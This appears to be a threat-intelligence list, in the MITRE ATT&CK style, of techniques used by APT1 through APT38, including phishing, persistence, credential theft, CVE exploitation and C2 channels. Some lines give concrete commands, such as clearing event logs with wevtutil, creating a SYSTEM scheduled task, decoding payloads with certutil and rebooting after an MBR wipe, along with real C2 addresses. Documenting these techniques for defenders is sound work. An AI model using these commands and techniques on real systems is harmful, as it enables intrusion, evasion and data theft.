APT1 has sent spearphishing emails containing malicious attachments.
APT1 has sent spearphishing emails containing hyperlinks to malicious files.
APT1 used the &lt;code&gt;ipconfig /all&lt;/code&gt; command to gather network configuration information.
APT1 used the &lt;code&gt;net use&lt;/code&gt; command to get a listing on network connections.
APT1 used the commands &lt;code&gt;net start&lt;/code&gt; and &lt;code&gt;tasklist&lt;/code&gt; to get a listing of the services on the system.
APT1 has used various open-source tools for privilege escalation purposes.
APT1 has used the Windows command shell to execute commands, and batch scripting to automate execution.
APT12 has used blogs and WordPress for C2 infrastructure.
APT12 has used multiple variants of DNS Calculation including multiplying the first two octets of an IP address and adding the third octet to that value in order to get a resulting command and control port.
APT12 has exploited multiple vulnerabilities for execution, including Microsoft Office vulnerabilities (CVE-2009-3129, CVE-2012-0158) and vulnerabilities in Adobe Reader and Flash (CVE-2009-4324, CVE-2009-0927, CVE-2011-0609, CVE-2011-0611).
APT12 has attempted to get victims to open malicious Microsoft Word and PDF attachment sent via spearphishing.
APT12 has sent emails with malicious Microsoft Office documents and PDFs attached.
APT16 has compromised otherwise legitimate sites as staging servers for second-stage payloads.
APT17 has created and cultivated profile pages in Microsoft TechNet. To make profile pages appear more legitimate, APT17 has created biographical sections and posted in forum threads.
APT17 has created profile pages in Microsoft TechNet that were used as C2 infrastructure.
APT18 actors used the native at Windows task scheduler tool to use scheduled tasks for execution on a victim network.
APT18 uses DNS for C2 communications.
APT18 obfuscates strings in the payload.
APT18 actors leverage legitimate credentials to log into external remote services.
APT18 actors deleted tools and batch files from victim systems.
APT18 can list files information for specific directories.
APT18 can upload a file to the victim’s machine.
APT18 establishes persistence via the &lt;code&gt;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt; key.
APT18 can collect system information from the victim’s machine.
APT18 actors leverage legitimate credentials to log into external remote services.
APT18 uses HTTP for C2 communications.
APT18 uses cmd.exe to execute commands on the victim’s machine.
APT19 used Base64 to obfuscate executed commands.
APT19 downloaded and launched code within a SCT file.
APT19 launched an HTTP malware variant and a Port 22 malware variant using a legitimate executable that loaded the malicious DLL.
An APT19 HTTP malware variant decrypts strings using single-byte XOR keys.
APT19 performed a watering hole attack on forbes.com in 2014 to compromise targets.
APT19 used Base64 to obfuscate payloads.
APT19 used &lt;code&gt;-W Hidden&lt;/code&gt; to conceal PowerShell windows by setting the WindowStyle parameter to hidden.
APT19 attempted to get users to launch malicious attachments delivered via spearphishing emails.
APT19 uses a Port 22 malware variant to modify several Registry keys.
APT19 used PowerShell commands to execute payloads.
An APT19 HTTP malware variant establishes persistence by setting the Registry key &lt;code&gt;HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Windows Debug Tools-%LOCALAPPDATA%\&lt;/code&gt;.
APT19 used Regsvr32 to bypass application control techniques.
APT19 configured its payload to inject into the rundll32.exe.
APT19 sent spearphishing emails with malicious attachments in RTF and XLSM formats to deliver initial exploits.
An APT19 HTTP malware variant used Base64 to encode communications to the C2 server.
APT19 collected system architecture information. APT19 used an HTTP malware variant and a Port 22 malware variant to gather the hostname and CPU information from the victim’s machine.
APT19 used an HTTP malware variant and a Port 22 malware variant to collect the MAC address and IP address from the victim’s machine.
APT19 used an HTTP malware variant and a Port 22 malware variant to collect the victim’s username.
APT19 has obtained and used publicly-available tools like Empire.
APT19 used HTTP for C2 communications. APT19 also used an HTTP malware variant to communicate over HTTP for C2.
An APT19 Port 22 malware variant registers itself as a service.
APT28 has used a Powershell cmdlet to grant the &lt;code&gt;ApplicationImpersonation&lt;/code&gt; role to a compromised account.
APT28 has used several malicious applications that abused OAuth access tokens to gain access to target email accounts, including Gmail and Yahoo Mail.
APT28 used a publicly available tool to gather and compress multiple documents on the DCCC and DNC networks.
APT28 has used a variety of utilities, including WinRAR, to archive collected data with password protection.
APT28 used a publicly available tool to gather and compress multiple documents on the DCCC and DNC networks.
APT28 has used Google Drive for C2.
APT28 has deployed a bootkit along with Downdelph to ensure its persistence on the victim. The bootkit shares code with some variants of BlackEnergy.
APT28 can perform brute force attacks to obtain credentials.
APT28 has cleared event logs, including by using the commands &lt;code&gt;wevtutil cl System&lt;/code&gt; and &lt;code&gt;wevtutil cl Security&lt;/code&gt;.
APT28 has used compromised Office 365 service accounts with Global Administrator privileges to collect email from user inboxes.
APT28 uses a tool that captures information from air-gapped computers via an infected USB and transfers it to network-connected computer when the USB is inserted.
APT28 has used COM hijacking for persistence by replacing the legitimate &lt;code&gt;MMDeviceEnumerator&lt;/code&gt; object with a payload.
APT28 has harvested user's login credentials.
APT28 has split archived exfiltration files into chunks smaller than 1MB.
APT28 has collected files from various information repositories.
APT28 has retrieved internal documents from machines inside victim environments, including by using Forfiles to stage documents before exfiltration.
APT28 has collected files from network shared drives.
An APT28 backdoor may collect the entire contents of an inserted USB device.
An APT28 macro uses the command &lt;code&gt;certutil -decode&lt;/code&gt; to decode contents of a .txt file storing the base64 encoded payload.
APT28 registered domains imitating NATO, OSCE security websites, Caucasus information resources, and other organizations.
APT28 has compromised targets via strategic web compromise utilizing custom exploit kits. APT28 used reflected cross-site scripting (XSS) against government websites to redirect users to phishing webpages.
APT28 has delivered JHUHUGIT and Koadic by executing PowerShell commands through DDE in Word documents.
APT28 has used compromised email accounts to send credential phishing emails.
APT28 encrypted a .dll payload using RTL and a custom encryption algorithm. APT28 has also obfuscated payloads with base64, XOR, and RC4.
APT28 has exfiltrated archives of collected data previously staged on a target's OWA server via HTTPS.
APT28 can exfiltrate data over Google Drive.
APT28 has used a variety of public exploits, including CVE 2020-0688 and CVE 2020-17144, to gain execution on vulnerable Microsoft Exchange; they have also conducted SQL injection attacks against external websites.
APT28 has exploited Microsoft Office vulnerability CVE-2017-0262 for execution.
APT28 has used CVE-2015-4902 to bypass security features.
APT28 has exploited CVE-2014-4076, CVE-2015-2387, CVE-2015-1701, CVE-2017-0263 to escalate privileges.
APT28 exploited a Windows SMB Remote Code Execution Vulnerability to conduct lateral movement.
APT28 used other victims as proxies to relay command traffic, for instance using a compromised Georgian military email server as a hop point to NATO victims. The group has also used a tool that acts as a proxy to allow C2 even if the victim is behind a router. APT28 has also used a machine to relay and obscure communications between CHOPSTICK and their server.
APT28 has used Tor and a variety of commercial VPN services to route brute force authentication attempts.
APT28 has intentionally deleted computer files to cover their tracks, including with use of the program CCleaner.
APT28 has used Forfiles to locate PDF, Excel, and Word documents during collection. The group also searched a compromised DCCC computer for specific terms.
APT28 has saved files with hidden file attributes.
APT28 has used the WindowStyle parameter to conceal PowerShell windows.
APT28 has downloaded additional files, including by using a first-stage downloader to contact the C2 server to obtain the second-stage implant.
APT28 added "junk data" to each encoded string, preventing trivial decoding without knowledge of the junk removal algorithm. Each implant was given a "junk length" value when created, tracked by the controller software to allow seamless communication but prevent analysis of the command protocol on the wire.
APT28 has used tools to perform keylogging.
APT28 regularly deploys both publicly available (ex: Mimikatz) and custom password retrieval tools on victims. They have also dumped the LSASS process memory using the MiniDump function.
APT28 has stored captured credential information in a file named pi.log.
An APT28 loader Trojan adds the Registry key &lt;code&gt;HKCU\Environment\UserInitMprLogonScript&lt;/code&gt; to establish persistence.
APT28 has used IMAP, POP3, and SMTP for a communication channel in various implants, including using self-registered Google Mail accounts and later compromised email servers of its victims.
APT28 attempted to get users to click on Microsoft Office attachments containing malicious macro scripts.
APT28 has tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders.
APT28 has renamed the WinRAR utility to avoid detection.
APT28 has changed extensions on files containing exfiltrated data to make them appear benign, and renamed a web shell instance to appear as a legitimate OWA page.
APT28 has routed traffic over Tor and VPN servers to obfuscate their activities.
APT28 has used the ntdsutil.exe utility to export the Active Directory database for credential access.
In 2016, APT28 conducted a distributed denial of service (DDoS) attack against the World Anti-Doping Agency.
APT28 compromised Ubiquiti network devices to act as collection devices for credentials compromised via phishing webpages.
APT28 deployed the open source tool Responder to conduct NetBIOS Name Service poisoning, which captured usernames and hashed passwords that allowed access to legitimate credentials. APT28 close-access teams have used Wi-Fi pineapples to intercept Wi-Fi signals and user credentials.
APT28 regularly deploys both publicly available (ex: Mimikatz) and custom password retrieval tools on victims.
APT28 has used the Office Test persistence mechanism within Microsoft Office by adding the Registry key &lt;code&gt;HKCU\Software\Microsoft\Office test\Special\Perf&lt;/code&gt; to execute code.
APT28 has used pass the hash for lateral movement.
APT28 has used a brute-force/password-spray tooling that operated in two modes: in brute-force mode it typically sent over 300 authentication attempts per hour per targeted account over the course of several hours or days. APT28 has also used a Kubernetes cluster to conduct distributed, large-scale password guessing attacks.
APT28 has used a brute-force/password-spray tooling that operated in two modes: in password-spraying mode it conducted approximately four authentication attempts per hour per targeted account over the course of several days or weeks. APT28 has also used a Kubernetes cluster to conduct distributed, large-scale password spray attacks.
APT28 uses a module to receive a notification every time a USB mass storage device is inserted into a victim.
APT28 has used spearphishing to compromise credentials.
APT28 downloads and executes PowerShell scripts and performs PowerShell commands.
An APT28 loader Trojan will enumerate the victim's processes searching for explorer.exe if its current process does not have necessary permissions.
APT28 has deployed malware that has copied itself to the startup directory for persistence.
APT28 has staged archives of collected data on a target's Outlook Web Access (OWA) server.
APT28 has collected emails from victim Microsoft Exchange servers.
APT28 uses a tool to infect connected USB devices and transmit itself to air-gapped computers when the infected USB device is inserted.
APT28 has used a UEFI (Unified Extensible Firmware Interface) rootkit known as LoJax.
APT28 executed CHOPSTICK by using rundll32 commands such as &lt;code&gt;rundll32.exe “C:\Windows\twain_64.dll”&lt;/code&gt;. APT28 also executed a .dll for a first stage dropper using rundll32.exe. An APT28 loader Trojan saved a batch script that uses rundll32 to execute a DLL payload.
APT28 has mapped network drives using Net and administrator credentials.
APT28 has used tools to take screenshots from victims.
APT28 has collected information from Microsoft SharePoint services within target networks.
APT28 sent spearphishing emails containing malicious Microsoft Office and RAR attachments.
APT28 sent spearphishing emails which used a URL-shortener service to masquerade as a legitimate service and to redirect targets to credential harvesting sites.
APT28 has conducted credential phishing campaigns with embedded links to attacker-controlled domains.
APT28 has used several malicious applications to steal user OAuth access tokens including applications masquerading as "Google Defender" "Google Email Protection," and "Google Scanner" for Gmail users. They also targeted Yahoo users with applications masquerading as "Delivery Service" and "McAfee Email Protection".
APT28 installed a Delphi backdoor that used a custom algorithm for C2 communications.
APT28 used weaponized Microsoft Word documents abusing the remote template function to retrieve a malicious macro.
APT28 has performed timestomping on victim files.
APT28 has used CVE-2015-1701 to access the SYSTEM token and copy it into the current process as part of privilege escalation.
APT28 has obtained and used open-source tools like Koadic, Mimikatz, and Responder.
Once APT28 gained access to the DCCC network, the group then proceeded to use that access to compromise the DNC network.
APT28 has used legitimate credentials to gain initial access, maintain access, and exfiltrate data from a victim network. The group has specifically used credentials stolen through a spearphishing email to login to the DCCC network. The group has also leveraged default manufacturer's passwords to gain initial access to corporate networks via IoT devices such as a VOIP phone, printer, and video decoder.
APT28 hosted phishing domains on free services for brief periods of time during campaigns.
APT28 has performed large-scale scans in an attempt to find vulnerable servers.
Later implants used by APT28, such as CHOPSTICK, use a blend of HTTP, HTTPS, and other legitimate channels for C2, depending on module configuration.
APT28 has used newly-created Blogspot pages for credential harvesting operations.
APT28 has used a modified and obfuscated version of the reGeorg web shell to maintain persistence on a target's Outlook Web Access (OWA) server.
An APT28 loader Trojan uses a cmd.exe and batch script to run its payload. The group has also used macros to execute payloads.
APT29 used sticky-keys to obtain unauthenticated, privileged console access.
APT29 has used a compromised global administrator account in Azure AD to backdoor a service principal with `ApplicationImpersonation` rights to start collecting emails from targeted mailboxes; APT29 has also used compromised accounts holding `ApplicationImpersonation` rights in Exchange to collect emails.
APT29 used large size files to avoid detection by security solutions with hardcoded size limits.
APT29 has hijacked legitimate application-specific startup scripts to enable malware to execute on system startup.
APT29 has bypassed UAC.
APT29 has leveraged the Microsoft Graph API to perform various actions across Azure and M365 environments. They have also utilized AADInternals PowerShell Modules to access the API
APT29 has conducted enumeration of Azure AD accounts.
APT29 can create new users through Azure AD.
APT29 has used residential proxies, including Azure Virtual Machines, to obfuscate their access to victim environments.
APT29 has gained access to a global administrator account in Azure AD and has used `Service Principal` credentials in Exchange.
APT29 has used Azure Run Command and Azure Admin-on-Behalf-of (AOBO) to execute code on virtual machines.
APT29 has leveraged compromised high-privileged on-premises accounts synced to Office 365 to move laterally into a cloud environment, including through the use of Azure AD PowerShell.
APT29 has stolen data from compromised hosts.
APT29 has enrolled their own devices into compromised cloud tenants, including enrolling a device in MFA to an Azure AD environment following a successful password guessing attack against a dormant account.
APT29 has created self-signed digital certificates to enable mutual TLS authentication for malware.
APT29 has disabled Purview Audit on targeted accounts prior to stealing emails from  Microsoft 365 tenants.
APT29 has used the meek domain fronting plugin for Tor to hide the destination of C2 traffic.
APT29 has used Dynamic DNS providers for their malware C2 infrastructure.
APT29 has compromised email accounts to further enable phishing campaigns and taken control of dormant accounts.
APT29 has used multiple layers of encryption within malware to protect C2 communication.
APT29 has exploited CVE-2019-19781 for Citrix, CVE-2019-11510 for Pulse Secure VPNs, CVE-2018-13379 for FortiGate VPNs, and CVE-2019-9670 in Zimbra software to gain access.
APT29 has used multiple software exploits for common client software, like Microsoft Word, Exchange, and Adobe Reader, to gain code execution.
APT29 has exploited CVE-2021-36934 to escalate privileges on a compromised host.
APT29 uses compromised residential endpoints as proxies for defense evasion and network access.
APT29 has used compromised identities to access networks via VPNs and Citrix.
APT29 has used SDelete to remove artifacts from victim networks.
APT29 has embedded an ISO file within an HTML attachment that contained JavaScript code to initiate malware execution.
APT29 uses compromised residential endpoints, typically within the same ISP IP address range, as proxies to hide the true source of C2 traffic.
APT29 has edited the `Microsoft.IdentityServer.Servicehost.exe.config` file to load a malicious DLL into the AD FS process, thereby enabling persistent access to any service federated with AD FS for a user with a specified User Principal Name.
APT29 has downloaded additional tools and malware onto compromised networks.
APT29 has ensured web servers in a victim environment are Internet accessible before copying tools or malware to it.
APT29 has used the `reg save` command to extract LSA secrets offline.
APT29 targets dormant or inactive user accounts, accounts belonging to individuals no longer at the organization but whose accounts remain on the system, for access and persistence.
APT29 has used various forms of spearphishing attempting to get a user to open attachments, including, but not limited to, malicious Microsoft Word documents, .pdf, and .lnk files.
APT29 has used various forms of spearphishing attempting to get a user to click on a malicous link.
APT29 has used unique malware in many of their operations.
APT29 has embedded ISO images and VHDX files in HTML to evade Mark-of-the-Web.
APT29 has renamed malicious DLLs with legitimate names to appear benign; they have also created an Azure AD certificate with a Common Name that matched the display name of the compromised service principal.
APT29 has use `mshta` to execute malicious scripts on a compromised host.
APT29 has used repeated MFA requests to gain access to victim accounts.
A backdoor used by APT29 created a Tor hidden service to forward traffic from the Tor client to local ports 3389 (RDP), 139 (Netbios), and 445 (SMB) enabling full remote access from outside the network and has also used TOR.
APT29 used Kerberos ticket attacks for lateral movement.
APT29 has successfully conducted password guessing attacks against a list of mailboxes.
APT29 has conducted brute force password spray attacks.
APT29 has used encoded PowerShell scripts uploaded to CozyCar installations to download and install SeaDuke.
APT29 has developed malware variants written in Python.
APT29 has installed a run command on a compromised system to enable malware execution on system startup.
APT29 added Registry Run keys to establish persistence.
APT29 has collected emails from targeted mailboxes within a compromised Azure AD tenant and compromised Exchange servers, including via Exchange Web Services (EWS) API requests.
APT29 has used named and hijacked scheduled tasks to establish persistence.
APT29 has used the `reg save` command to save registry hives.
APT29 used UPX to pack files.
APT29 has used spearphishing emails with an attachment to deliver files with exploits to initial victims.
APT29 has used spearphishing with a link to trick victims into clicking on a link to a zip file containing malicious files.
APT29 has used the legitimate mailing service Constant Contact to send phishing e-mails.
APT29 uses stolen tokens to access victim accounts, without needing a password.
APT29 has abused misconfigured AD CS certificate templates to impersonate admin users and create additional authentication certificates.
APT29 has used timestomping to alter the Standard Information timestamps on their web shells to match other files in the same directory.
APT29 has obtained and used a variety of tools including Mimikatz, SDelete, Tor, meek, and Cobalt Strike.
APT29 has compromised IT, cloud services, and managed services providers to gain broad access to multiple customers for subsequent operations.
APT29 has used a compromised account to access an organization's VPN infrastructure.
APT29 has conducted widespread scanning of target environments to identify vulnerabilities for exploit.
APT29 has registered algorithmically generated Twitter handles that are used for C2 by malware, such as HAMMERTOSS. APT29 has also used legitimate web services such as Dropbox and Constant Contact in their operations.
APT29 has installed web shells on exploited Microsoft Exchange servers.
APT29 used WMI to steal credentials and execute backdoors at a future time.
APT29 has used WMI event subscriptions for persistence.
APT3 replaces the Sticky Keys binary &lt;code&gt;C:\Windows\System32\sethc.exe&lt;/code&gt; for persistence.
APT3 has been known to add created accounts to local admin groups to maintain elevated access.
APT3 has used tools to compress data before exfilling it.
APT3 has a tool that can locate credentials in files on the file system such as those from Firefox or Chrome.
APT3 has used tools to dump passwords from browsers.
APT3 has been known to side load DLLs with a valid version of Chrome with one of their tools.
APT3 will identify Microsoft Office documents on the victim's computer.
APT3 leverages valid accounts after gaining credentials for use within the victim domain.
APT3 has a tool that exfiltrates data over the C2 channel.
APT3 has exploited the Adobe Flash Player vulnerability CVE-2015-3113 and Internet Explorer vulnerability CVE-2014-1776.
An APT3 downloader establishes SOCKS5 connections for its initial C2.
APT3 has a tool that can delete files.
APT3 has a tool that looks for files and directories on the local file system.
APT3 has been known to use &lt;code&gt;-WindowStyle Hidden&lt;/code&gt; to conceal PowerShell windows.
APT3 has been known to remove indicators of compromise from tools.
APT3 has a tool that can copy files to remote machines.
APT3 has used a keylogging tool that records keystrokes in encrypted files.
APT3 has used a tool to dump credentials by injecting itself into lsass.exe and triggering with the argument "dig."
APT3 has used a tool that can obtain info about local and global group users, power users, and administrators.
APT3 has been known to create or enable accounts, such as &lt;code&gt;support_388945a0&lt;/code&gt;.
APT3 has been known to stage files for exfiltration in a single location.
APT3 has lured victims into clicking malicious links delivered through spearphishing.
An APT3 downloader first establishes a SOCKS5 connection to 192.157.198[.]103 using TCP port 1913; once the server response is verified, it then requests a connection to 192.184.60[.]229 on TCP port 81.
An APT3 downloader establishes SOCKS5 connections for its initial C2.
APT3 obfuscates files or information to help evade defensive measures.
APT3 has been known to brute force password hashes to be able to leverage plain text credentials.
APT3 has a tool that can enumerate the permissions associated with Windows groups.
APT3 has used PowerShell on victim systems to download and run payloads after exploitation.
APT3 has a tool that can list out currently running processes.
APT3 places scripts in the startup folder for persistence.
APT3 enables the Remote Desktop Protocol for persistence. APT3 has also interacted with compromised systems to browse and copy files through RDP sessions.
APT3 has a tool that can detect the existence of remote systems.
APT3 has a tool that can run DLLs.
APT3 will copy files over to Windows Admin Shares (like ADMIN$) as part of lateral movement.
An APT3 downloader creates persistence by creating the following scheduled task: &lt;code&gt;schtasks /create /tn "mysc" /tr C:\Users\Public\test.exe /sc ONLOGON /ru "System"&lt;/code&gt;.
APT3 has been known to pack their tools.
APT3 has sent spearphishing emails containing malicious links.
APT3 has a tool that can obtain information about the local system.
A keylogging tool used by APT3 gathers network information from the victim, including the MAC address, IP address, WINS, DHCP server, and gateway.
APT3 has a tool that can enumerate current network connections.
An APT3 downloader uses the Windows command &lt;code&gt;"cmd.exe" /C whoami&lt;/code&gt; to verify that it is running with the elevated privileges of “System.”
An APT3 downloader uses the Windows command &lt;code&gt;"cmd.exe" /C whoami&lt;/code&gt;. The group also uses a tool to execute commands on remote computers.
APT3 has a tool that creates a new service for persistence.
APT30 has relied on users to execute malicious file attachments delivered via spearphishing emails.
APT30 has used spearphishing emails with malicious DOC attachments.
APT32's backdoor has used LZMA compression and RC4 encryption before exfiltration.
APT32 includes garbage code to mislead anti-malware software and researchers.
APT32 has cleared select event log entries.
APT32 has used the `Invoke-Obfuscation` framework to obfuscate their PowerShell.
APT32 has used COM scriptlets to download Cobalt Strike beacons.
APT32 used Outlook Credential Dumper to harvest credentials stored in Windows registry.
APT32 ran legitimately-signed executables from Symantec and McAfee which load a malicious DLL. The group also side-loads its backdoor by dropping a library and a legitimate, signed executable (AcroTranscoder).
APT32 has set up and operated websites to gather information and deliver malware.
APT32 has infected victims by tricking them into visiting compromised watering hole websites.
APT32 has stood up websites containing numerous articles and content scraped from the Internet to make them appear legitimate, but some of these pages include malicious JavaScript to profile the potential victim or infect them via a fake software update.
APT32 has collected e-mail addresses for activists and bloggers in order to target them with spyware.
APT32 has performed code obfuscation, including encoding payloads using Base64 and using a framework called "Dont-Kill-My-Cat (DKMC). APT32 also encrypts the library used for network exfiltration with AES-256 in CBC mode in their macOS backdoor.
APT32's backdoor has exfiltrated data using the already opened channel with its C&amp;C server.
APT32's backdoor can exfiltrate data by encoding it in the subdomain field of DNS packets.
APT32 has used RTF document that includes an exploit to execute malicious code. (CVE-2017-11882)
APT32 has used CVE-2016-7255 to escalate privileges.
APT32's macOS backdoor can receive a “delete” command.
APT32's backdoor possesses the capability to list files and directories on a machine.
APT32's backdoor has stored its configuration in a registry key.
APT32 has conducted targeted surveillance against activists and bloggers.
APT32's macOS backdoor hides the clientID file via a chflags function.
APT32 has used the WindowStyle parameter to conceal PowerShell windows.
APT32 has added JavaScript to victim websites to download additional frameworks that profile and compromise website visitors.
APT32 has used JavaScript for drive-by downloads and C2 communications.
APT32 has abused the PasswordChangeNotify to monitor for and capture account password changes.
APT32 used Mimikatz and customized versions of Windows Credential Dumper to harvest credentials.
APT32 has deployed tools after moving laterally using administrative accounts.
APT32's macOS backdoor changes the permission of the file it wants to execute to 755.
APT32 enumerated administrative users using the commands &lt;code&gt;net localgroup administrators&lt;/code&gt;.
APT32 has used legitimate local admin account credentials.
APT32 has used email for C2 via an Office macro.
APT32 has attempted to lure users to execute a malicious dropper delivered via a spearphishing attachment.
APT32 has lured targets to download a Cobalt Strike beacon by including a malicious link within spearphishing emails.
APT32 has used hidden or non-printing characters to help masquerade service names, such as appending a Unicode no-break space character to a legitimate service name. APT32 has also impersonated the legitimate Flash installer file name "install_flashplayer.exe".
APT32 has disguised a Cobalt Strike beacon as a Flash Installer.
APT32 has renamed a NetCat binary to kb-10233.exe to masquerade as a Windows update. APT32 has also renamed a Cobalt Strike beacon payload to install_flashplayers.exe.
APT32's backdoor has modified the Windows Registry to store the backdoor's configuration.
APT32 has used mshta.exe for code execution.
APT32 used NTFS alternate data streams to hide their payloads.
APT32 performed network scanning on the network to search for open ports, services, OS finger-printing, and other vulnerabilities.
APT32 used the &lt;code&gt;net view&lt;/code&gt; command to show all shares available, including the administrative shares such as &lt;code&gt;C$&lt;/code&gt; and &lt;code&gt;ADMIN$&lt;/code&gt;.
An APT32 backdoor can use HTTP over a non-standard TCP port (e.g 14146) which is specified in the backdoor configuration.
APT32 used GetPassword_x64 to harvest credentials.
APT32 have replaced Microsoft Outlook's VbaProject.OTM file to install a backdoor macro for persistence.
APT32 has used pass the hash for lateral movement.
APT32 successfully gained remote access by using pass the ticket.
APT32 has used PowerShell-based tools, PowerShell one-liners, and shellcode loaders for execution.
APT32 malware has injected a Cobalt Strike beacon into Rundll32.exe.
APT32 has used PubPrn.vbs within execution scripts to execute malware, possibly bypassing defenses.
APT32's backdoor can query the Windows Registry to gather system information.
APT32 established persistence using Registry Run keys, both to execute PowerShell and VBS scripts as well as to execute their backdoor directly.
APT32 created a Scheduled Task/Job that used regsvr32.exe to execute a COM scriptlet that dynamically downloaded a backdoor and injected it into memory. The group has also used regsvr32 to run their backdoor.
APT32 has enumerated DC servers using the command &lt;code&gt;net group "Domain Controllers" /domain&lt;/code&gt;. The group has also used the &lt;code&gt;ping&lt;/code&gt; command.
APT32 has moved and renamed pubprn.vbs to a .txt file to avoid detection.
APT32 malware has used rundll32.exe to execute an initial infection process.
APT32 used Net to use Windows' hidden network shares to copy their tools to remote machines for execution.
APT32 has used scheduled tasks to persist on victim systems.
APT32's backdoor has used Windows services as a way to execute its malicious payload.
APT32 has set up Facebook pages in tandem with fake websites.
APT32 compromised McAfee ePO to move laterally by distributing malware as a software deployment task.
APT32 has sent spearphishing emails with a malicious executable disguised as a document or spreadsheet.
APT32 has sent spearphishing emails containing malicious links.
APT32 has used malicious links to direct users to web pages designed to harvest credentials.
APT32 has collected the OS version and computer name from victims. One of the group's backdoors can also query the Windows Registry to gather system information, and another macOS backdoor performs a fingerprint of the machine on its first connection to the C&amp;C server. APT32 executed shellcode to identify the name of the infected host.
APT32 used the &lt;code&gt;ipconfig /all&lt;/code&gt; command to gather the IP address from the system.
APT32 used the &lt;code&gt;netstat -anpo tcp&lt;/code&gt; command to display TCP connections on the victim's machine.
APT32 collected the victim's username and executed the &lt;code&gt;whoami&lt;/code&gt; command on the victim's machine. APT32 executed shellcode to collect the username on the victim's machine.
APT32 has used scheduled task raw XML with a backdated timestamp of June 2, 2016. The group has also set the creation time of the files dropped by the second stage of the exploit to match the creation time of kernel32.dll. Additionally, APT32 has used a random value to modify the timestamp of the file storing the clientID.
APT32 has obtained and used tools such as Mimikatz and Cobalt Strike, and a variety of other open-source tools from GitHub.
APT32 has hosted malicious payloads in Dropbox, Amazon S3, and Google Drive for use during targeting.
APT32 has used macros, COM scriptlets, and VBS scripts.
APT32 has used JavaScript that communicates over HTTP or HTTPS to attacker controlled domains to download additional frameworks. The group has also used downloaded encrypted payloads over HTTP.
APT32 has used Dropbox, Amazon S3, and Google Drive to host malicious downloads.
APT32 has set up Dropbox, Amazon S3, and Google Drive to host malicious downloads.
APT32 has used Web shells to maintain access to victim websites.
APT32 has used cmd.exe for execution.
APT32 used WMI to deploy their tools on remote machines and to gather information about the Outlook process.
APT32 modified Windows Services to ensure PowerShell scripts were loaded on the system. APT32 also creates a Windows service to establish persistence.
APT33 has used WinRAR to compress data prior to exfil.
APT33 has used a variety of publicly available tools like LaZagne to gather credentials.
APT33 has used compromised Office 365 accounts in tandem with Ruler in an attempt to gain control of endpoints.
APT33 has used a variety of publicly available tools like LaZagne to gather credentials.
APT33 has used a variety of publicly available tools like LaZagne to gather credentials.
APT33 has used a variety of publicly available tools like LaZagne to gather credentials.
APT33 has used base64 to encode payloads.
APT33 has used FTP to exfiltrate files (separately from the C2 channel).
APT33 has attempted to exploit a known vulnerability in WinRAR (CVE-2018-20250), and attempted to gain remote code execution via a security bypass vulnerability (CVE-2017-11774).
APT33 has used a publicly available exploit for CVE-2017-0213 to escalate privileges on a local system.
APT33 has used a variety of publicly available tools like Gpppassword to gather credentials.
APT33 has downloaded additional files and programs from its C2 server.
APT33 has used a variety of publicly available tools like LaZagne to gather credentials.
APT33 has used a variety of publicly available tools like LaZagne, Mimikatz, and ProcDump to dump credentials.
APT33 has used malicious e-mail attachments to lure victims into executing malware.
APT33 has lured users to click links to malicious HTML applications delivered via spearphishing emails.
APT33 has used SniffPass to collect credentials by sniffing network traffic.
APT33 has used HTTP over TCP ports 808 and 880 for command and control.
APT33 has used password spraying to gain access to target systems.
APT33 has utilized PowerShell to download files from the C2 server and run various scripts.
APT33 has deployed a tool known as DarkComet to the Startup folder of a victim, and used Registry run keys to gain persistence.
APT33 has created a scheduled task to execute a .vbe file multiple times a day.
APT33 has sent spearphishing e-mails with archive attachments.
APT33 has sent spearphishing emails containing links to .hta files.
APT33 has used base64 to encode command and control traffic.
APT33 has used AES for encryption of command and control traffic.
APT33 has obtained and leveraged publicly-available tools for early intrusion activities.
APT33 has used valid accounts for initial access and privilege escalation.
APT33 has used VBScript to initiate the delivery of payloads.
APT33 has used HTTP for command and control.
APT33 has attempted to use WMI event subscriptions to establish persistence on compromised hosts.
APT37 has used an audio capturing utility known as SOUNDWAVE that captures microphone input.
APT37 leverages social networking sites and cloud platforms (AOL, Twitter, Yandex, Mediafire, pCloud, Dropbox, and Box) for C2.
APT37 has a function in the initial dropper to bypass Windows UAC in order to execute the next payload with higher privileges.
APT37 has used Ruby scripts to execute payloads.
APT37 has used a credential stealer known as ZUMKONG that can harvest usernames and passwords stored in browsers.
APT37 has collected data from victims' local systems.
APT37 has access to destructive malware that is capable of overwriting a machine's Master Boot Record (MBR).
APT37 has used strategic web compromises, particularly of South Korean websites, to distribute malware. The group has also used torrent file-sharing sites to more indiscriminately disseminate malware to victims. As part of their compromises, the group has used a Javascript based profiler called RICECURRY to profile a victim's web browser and deliver malicious code accordingly.
APT37 has used Windows DDE for execution of commands and a malicious VBS.
APT37 has used exploits for Flash Player (CVE-2016-4117, CVE-2018-4878), Word (CVE-2017-0199), Internet Explorer (CVE-2020-1380 and CVE-2020-26411), and Microsoft Edge (CVE-2021-26411) for execution.
APT37 has downloaded second stage malware from compromised websites.
APT37 has signed its malware with an invalid digital certificates listed as “Tencent Technology (Shenzhen) Company Limited.”
APT37 has sent spearphishing attachments attempting to get a user to open them.
APT37 leverages the Windows API calls: VirtualAlloc(), WriteProcessMemory(), and CreateRemoteThread() for process injection.
APT37 obfuscates strings and payloads.
APT37 has a Bluetooth device harvester, which uses Windows Bluetooth APIs to find information on connected Bluetooth devices.
APT37's Freenki malware lists running processes using the Microsoft Windows API.
APT37 injects its malware variant, ROKRAT, into the cmd.exe process.
APT37 has used Python scripts to execute payloads.
APT37's has added persistence via the Registry key &lt;code&gt;HKCU\Software\Microsoft\CurrentVersion\Run\&lt;/code&gt;.
APT37 has created scheduled tasks to run malicious scripts on a compromised host.
APT37 delivers malware using spearphishing emails with malicious HWP attachments.
APT37 uses steganography to send images to users that are embedded with shellcode.
APT37 collects the computer name, the BIOS model, and execution path.
APT37 identifies the victim username.
APT37 has used malware that will issue the command &lt;code&gt;shutdown /r /t 1&lt;/code&gt; to reboot a system after wiping its MBR.
APT37 executes shellcode and a VBA script to decode Base64 strings.
APT37 uses HTTPS to conceal C2 communications.
APT37 has used the command-line interface.
APT38 has collected browser bookmark information to learn more about compromised hosts, obtain personal information about users, and acquire details about internal network resources.
APT38 has used brute force techniques to attempt account access when passwords are unknown or when password hashes are unavailable.
APT38 clears Window Event logs and Sysmon logs from the system.
APT38 used a Trojan called KEYLIME to collect data from the clipboard.
APT38 has used CHM files to move concealed payloads.
